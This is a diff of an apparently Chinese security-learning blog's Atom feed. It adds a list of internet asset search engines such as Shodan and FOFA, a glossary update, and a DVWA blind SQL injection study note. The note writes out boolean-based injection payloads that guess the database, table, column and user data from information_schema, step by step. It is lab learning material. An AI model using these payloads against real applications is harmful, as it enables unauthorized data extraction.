@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>理想青年</title>
+  <title>理想青年 - 心有猛虎，细嗅蔷薇</title>
   
   
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-04-08T03:22:29.436Z</updated>
+  <updated>2022-04-14T13:05:24.571Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>网络空间搜索引擎</title>
+    <link href="http://example.com/2022/04/14/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
+    <id>http://example.com/2022/04/14/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</id>
+    <published>2022-04-14T13:00:07.000Z</published>
+    <updated>2022-04-14T13:05:24.571Z</updated>
+    
+    <content type="html"><![CDATA[<p>文章转载自：[APT-C-61团队][<a href="http://example.com/2022/03/31/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/]">http://example.com/2022/03/31/网络空间搜索引擎/]</a></p><h2 id="鹰图平台："><a href="#鹰图平台：" class="headerlink" title="鹰图平台："></a>鹰图平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hunter.qianxin.com/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.46.06.png"                      alt="截屏2022-03-31 17.46.06"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.46.06.png)</p><h2 id="Soall平台："><a href="#Soall平台：" class="headerlink" title="Soall平台："></a>Soall平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://soall.org/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.47.22.png"                      alt="截屏2022-03-31 17.47.22"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.47.22.png)</p><h2 id="Shodan平台："><a href="#Shodan平台：" class="headerlink" title="Shodan平台："></a>Shodan平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.48.13.png"                      alt="截屏2022-03-31 17.48.13"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.48.13.png)</p><h2 id="Censys平台："><a href="#Censys平台：" class="headerlink" title="Censys平台："></a>Censys平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://search.censys.io/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.48.53.png"                      alt="截屏2022-03-31 17.48.53"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.48.53.png)</p><h2 id="钟馗之眼："><a href="#钟馗之眼：" class="headerlink" title="钟馗之眼："></a>钟馗之眼：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.49.41.png"                      alt="截屏2022-03-31 17.49.41"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.49.41.png)</p><h2 id="onyphe平台："><a href="#onyphe平台：" class="headerlink" title="onyphe平台："></a>onyphe平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://onyphe.io/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.50.20.png"                      alt="img"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.50.20.png)</p><h2 id="FOFA平台："><a href="#FOFA平台：" class="headerlink" title="FOFA平台："></a>FOFA平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.info/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.51.00.png"                      alt="截屏2022-03-31 17.51.00"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.51.00.png)截屏2022-03-31 17.51.00</p><h2 id="Fullhunt平台"><a href="#Fullhunt平台" class="headerlink" title="Fullhunt平台:"></a>Fullhunt平台:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fullhunt.io/</span><br></pre></td></tr></table></figure><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.53.09.png"                      alt="截屏2022-03-31 17.53.09"                >](<a class="link"   href="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31" >https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/截屏2022-03-31<i class="fas fa-external-link-alt"></i></a> 17.53.09.png)</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;文章转载自：[APT-C-61团队][&lt;a href=&quot;http://example.com/2022/03/31/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/]&quot;&gt;htt</summary>
+      
+    
+    
+    
+    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="搜索引擎" scheme="http://example.com/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dvwa中的sql盲注学习</title>
+    <link href="http://example.com/2022/04/11/dvwa%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://example.com/2022/04/11/dvwa%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0/</id>
+    <published>2022-04-11T12:35:15.000Z</published>
+    <updated>2022-04-11T14:14:59.503Z</updated>
+    
+    <content type="html"><![CDATA[<p>刚开始也没有思路，不知道怎么测试注入点，然后就是看到一位表哥的文章，这才理解。这里贴出来文章地址<a class="link"   href="https://www.cnblogs.com/chadlas/articles/15735045.html" >DVWA靶场通关—-(8) SQL Injection(Blind)教程 <i class="fas fa-external-link-alt"></i></a></p><h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.先输入1，页面返回正常。</span><br><span class="line"></span><br><span class="line">2.输入&quot; 1\ &quot; , 页面返回异常。</span><br><span class="line"></span><br><span class="line">3.输入“1&#x27;#”,页面返回正常。//这样来猜测参数的闭合方式</span><br></pre></td></tr></table></figure><p><strong>这里我刚开始用的and 1&#x3D;1#和1&#x3D;2#都返回不正常，后来才发现可能是因为“#”号没有url编码。</strong></p><p><strong>以下语句为了方便查看，都是未编码过的，但实际测试时候都经过编码(或者直接在输入框里输入语句，别再url上直接输入)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;=10#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=5#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=4#   //正常</span><br></pre></td></tr></table></figure><p>4.然后猜解表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">//这边然后直接用burp爆破，库名为dvwa</span><br></pre></td></tr></table></figure><p>5.判断数据库表的个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)&gt;=5#</span><br><span class="line">//有两张表</span><br></pre></td></tr></table></figure><p>6.猜解数据库表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br><span class="line">//表名users</span><br></pre></td></tr></table></figure><p>5.猜解字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure><p>6.猜解字段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select first_name from users limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure><h2 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2.Medium"></a>2.Medium</h2><p>查看代码，因为参数是下拉列表的，所以没有单引号，所以不需要闭合。还对一些特殊符号进行了过滤。因为是post型的，所以这里直接burp抓包，然后该数据。</p><p><strong>知识点：下拉列表的数字的这种形式，可能参数根本没有引号包裹，所以根本不需要想办法闭合什么的</strong></p><p>后面的就和low操作过程基本一样</p><h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>有limit来限制查询只能一条，这里直接用#给他砍掉，然后就是和low差不多了就。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;刚开始也没有思路，不知道怎么测试注入点，然后就是看到一位表哥的文章，这才理解。这里贴出来文章地址&lt;a class=&quot;link&quot;   href=&quot;https://www.cnblogs.com/chadlas/articles/15735045.html&quot; &gt;DVWA靶场通关</summary>
+      
+    
+    
+    
+    <category term="web安全学习" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>docker的简单使用</title>
@@ -122,13 +174,13 @@
   </entry>
   
   <entry>
-    <title>cms、后台、后端、web服务器一些术语的理解</title>
-    <link href="http://example.com/2022/04/02/cms%E3%80%81%E5%90%8E%E5%8F%B0%E3%80%81%E5%90%8E%E7%AB%AF%E3%80%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%E7%9A%84%E7%90%86%E8%A7%A3/"/>
-    <id>http://example.com/2022/04/02/cms%E3%80%81%E5%90%8E%E5%8F%B0%E3%80%81%E5%90%8E%E7%AB%AF%E3%80%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%E7%9A%84%E7%90%86%E8%A7%A3/</id>
+    <title>web安全一些名词解释</title>
+    <link href="http://example.com/2022/04/02/web%E5%AE%89%E5%85%A8%E4%B8%80%E4%BA%9B%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/"/>
+    <id>http://example.com/2022/04/02/web%E5%AE%89%E5%85%A8%E4%B8%80%E4%BA%9B%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/</id>
     <published>2022-04-02T13:32:44.000Z</published>
-    <updated>2022-04-02T13:36:15.898Z</updated>
+    <updated>2022-04-14T04:33:38.535Z</updated>
     
-    <content type="html"><![CDATA[<p><strong>CMS</strong>：是模板式的网站开发工具，直接套用模板开发网站，肯定包括后台管理系统，一套cms后台管理都挺类似的</p><p><strong>后台管理系统</strong>：可能是用某种语言写出来的一个管理网站的系统</p><p>转载自百度知道的一个解释：<br>但凡CMS，一定是有一套资深的网站后台管理系统的，功能强大的还能直接管理网站前端的一些功能。<br>但是网站后台管理系统不一定来源于CMS，也会有技术人员直接用PHP或者.net直接开发而成。<br>说白了就是CMS是半成品，网站后台管理系统是成品。所以二者的区别是，cms一定带有网站后台管理系统，但网站后台管理系统并不一定是CMS，有可能直接用语言写出来。</p><p><strong>后端</strong>：前端是写代码给浏览器看的。后端是写代码给服务器看的。后端就是一些应用程序，部署在web服务器上，前端通过这些后端应用程序来和数据库交互等。</p><p><strong>web服务器</strong>：就是一个容器，里面放着网站文件等</p><p>指服务器上运行着的一个软件，可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；可以放置数据文件，让全世界下载。目前最主流的三个Web服务器是Apache、 Nginx 、IIS。</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>CMS</strong>：是模板式的网站开发工具，直接套用模板开发网站，肯定包括后台管理系统，一套cms后台管理都挺类似的</p><p><strong>后台管理系统</strong>：可能是用某种语言写出来的一个管理网站的系统</p><p>转载自百度知道的一个解释：<br>但凡CMS，一定是有一套资深的网站后台管理系统的，功能强大的还能直接管理网站前端的一些功能。<br>但是网站后台管理系统不一定来源于CMS，也会有技术人员直接用PHP或者.net直接开发而成。<br>说白了就是CMS是半成品，网站后台管理系统是成品。所以二者的区别是，cms一定带有网站后台管理系统，但网站后台管理系统并不一定是CMS，有可能直接用语言写出来。</p><p><strong>后端</strong>：前端是写代码给浏览器看的。后端是写代码给服务器看的。后端就是一些应用程序，部署在web服务器上，前端通过这些后端应用程序来和数据库交互等。</p><p><strong>web服务器</strong>：就是一个容器，里面放着网站文件等</p><p>指服务器上运行着的一个软件，可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；可以放置数据文件，让全世界下载。目前最主流的三个Web服务器是Apache、 Nginx 、IIS。</p><p><strong>exp</strong> (Exploit )漏洞利用，一般是个demo程序</p><p><strong>poc</strong> (Proof of Concept)观点验证程序，一般就是个样本 用来证明和复现</p>]]></content>
     
     
       
